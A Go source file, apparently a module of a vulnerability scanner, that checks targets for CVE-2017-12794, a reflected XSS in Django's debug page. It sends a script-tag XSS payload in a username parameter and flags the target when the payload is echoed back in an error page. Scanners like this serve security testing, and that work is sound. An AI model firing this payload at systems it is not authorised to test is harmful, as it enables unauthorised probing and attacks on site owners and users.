package poc

import (
	"io/ioutil"
	"net/http"
	"strings"
	"youzai/util"
)

func (Info *PocInfo) CVE_2017_12794_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2017-12794"
	poc.Info.Target = "django"
	poc.Info.Type = "XSS"
	poc.Info.Name = "Django debug page reflect XSS"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	// 生成http客户端
	cli := util.Http_Client(poc.Config.Timeout, poc.Config.Proxy, poc.Config.Proxy_Url)

	// 编写自定义检测函数，返回值有两个，第一个是判断是否存在存在漏洞，第二个参数返回响应状态码
	poc.Config.Check = func() (bool, int) {
		retry := false
		for {
			request, err := http.NewRequest("GET", poc.Config.Url+"/create_user/?username=<script>alert(1)</script>", nil)
			if err != nil {
				return false, 0
			}
			request.Header.Add("User-Agent", poc.Config.User_Agent)
			if response, err := cli.Do(request); err != nil {
				return false, 0
			} else {
				defer response.Body.Close()
				body, _ := ioutil.ReadAll(response.Body)
				if response.StatusCode == 500 && strings.Contains(string(body), "<script>alert(1)</script>") {
					return true, response.StatusCode
				} else if response.StatusCode == 200 && strings.Contains(string(body), "user has been created") && !retry {
					retry = true
				} else {
					break
				}
			}
		}
		return false, 0
	}

	PocStruct = append(PocStruct, poc)
}
